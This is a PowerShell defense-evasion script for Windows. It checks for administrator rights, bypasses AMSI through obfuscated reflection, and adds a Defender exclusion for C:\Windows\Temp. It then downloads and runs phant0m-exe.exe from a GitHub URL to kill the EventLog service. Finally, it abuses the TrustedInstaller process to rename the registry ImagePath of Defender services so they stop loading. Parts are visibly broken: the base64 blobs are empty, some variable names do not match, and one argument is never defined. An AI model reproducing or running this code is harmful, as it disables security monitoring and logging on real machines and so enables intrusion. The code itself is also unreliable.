function BravoSix {

    # disable defender services and drivers with trustedinstaller
    Write-Host("[i] Disabling Defender services and drivers")
    $defenderProcesses = @("MpCmdRun.exe", "MpDlpCmd.exe", "MsMpEng.exe", "ConfigSecurityPolicy.exe", "NisSrv.exe", "MsSense.exe", "SenseCnCProxy.exe", "SenseIR.exe", "SenseCE.exe", "SenseSampleUploader.exe", "SenseNdr.exe", "SenseSC.exe")
    $defenderServices = @("WinDefend", "Sense", "WdNisSvc", "WdNisDrv", "WdBoot", "WdFilter")

    # spawning TrustedInstaller process
    Write-Host("[i] Spawning TrustedInstaller process")
    $trustedInstaller = ""

    Add-Type -TypeDefinition [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($trustedInstaller))
    $trustedInstallerService = "TrustedInstaller"
    if ($(Get-Service $trustedInstallerService).Status -ne "Running") {
        Start-Service $trustedInstallerService
    }

    Write-Host "Waiting for $trustedInstallerService to start..."
    Write-Host "TrustedInstaller is running {}".format($(Get-Process $serviceName).Id)

    $serviceProcessId = $(Get-Process $trustedInstallerService).Id
    $powershellPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

    # disabling defender services in registry
    $servicesRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\"
    foreach ($service in $defenderServices) {
        Write-Host "[i] Disabling $service service..."
        Write-Host "[i] Renaming $service service ImagePath type to BravoSix ..."
        Write-Host "[i] Original ImagePath value: " + (Get-ItemProperty -Path $servicesRegPath$service -Name ImagePath).ImagePath 
        $runPowershell = "-ExecutionPolicy Bypass -Command ""& {Rename-ItemProperty -Path $servicesRegPath$service -Name ImagePath -NewName BravoSix; Start-Sleep 5;}"""
        Write-Host "[i] Confirming ImagePath value: " + (Get-ItemProperty -Path $servicesRegPath$service -Name ImagePath).ImagePath
        [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
    }
}

function GoingDark {

    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Warning "You must be an Administrator to run this script."
        return
    }

    $goingdark = ""
    Write-Host([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($goingdark)))
    Write-Host "-... .-. .- ...- ---    ... .. -..- --..--    --. --- .. -. --.    -.. .- .-. -.- "

    # AMSI bypass
    Write-Host("\n[i] Disabling A" + "MSI")
    $a=[Ref].Assembly.GetTypes()
    foreach ($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
    $d=$c.GetFields('NonPublic,Static')
    foreach ($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
    $g=$f.SetValue($null,$true)

    # set defender exclusion
    Write-Host("[i] Setting Defender exclusion")
    $exclusionPath = "C:\Windows\Temp\*"
    Add-MpPreference -ExclusionPath $exclusionPath

    # killing eventlog service
    Write-Host("[i] Killing EventLog service")
    $phant0mPath = $exclusionPath + "phant0m-exe.exe"
    Invoke-WebRequest -Uri https://github.com/RFC1918-hub/RFCRandom/raw/main/phant0m-exe.exe -OutFile $phant0mPath  
    & $phantomPath
}

function Main {
    GoingDark
    BravoSix
}

Main
